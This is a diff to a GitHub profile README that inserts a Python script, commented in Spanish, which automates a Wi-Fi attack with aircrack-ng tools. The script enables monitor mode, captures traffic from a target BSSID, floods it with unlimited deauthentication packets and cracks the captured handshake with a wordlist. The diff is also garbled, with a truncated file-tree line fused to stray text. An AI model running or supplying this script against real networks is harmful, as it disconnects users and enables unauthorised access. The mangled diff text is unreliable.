@@ -7,8 +7,26 @@ wifi-security-audit/
 └── src/
     ├── __init__.py
     ├── wifi_scanner.py
-    └── wifi_crack.py
-<!---
-dgibran9/dgibran9 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+    └── wifi_crack.p  profile.
+
+import os
+
+# Configuración
+interface = "wlan0"
+bssid = "00:11:22:33:44:55"
+wordlist = "/path/to/wordlist.txt"
+output_file = "crack_output.txt"
+
+# Comandos
+commands = [
+    f"airmon-ng start {interface}",
+    f"airodump-ng -w capture --bssid {bssid} {interface}mon",
+    f"aireplay-ng --deauth 0 -a {bssid} {interface}mon",
+    f"aircrack-ng -w {wordlist} -b {bssid} capture-01.cap > {output_file}"
+]
+
+# Ejecutar comandos
+for cmd in commands:
+    os.system(cmd)
+
+print("Ataque completado. Revisa el archivo de salida para ver los resultados.") 
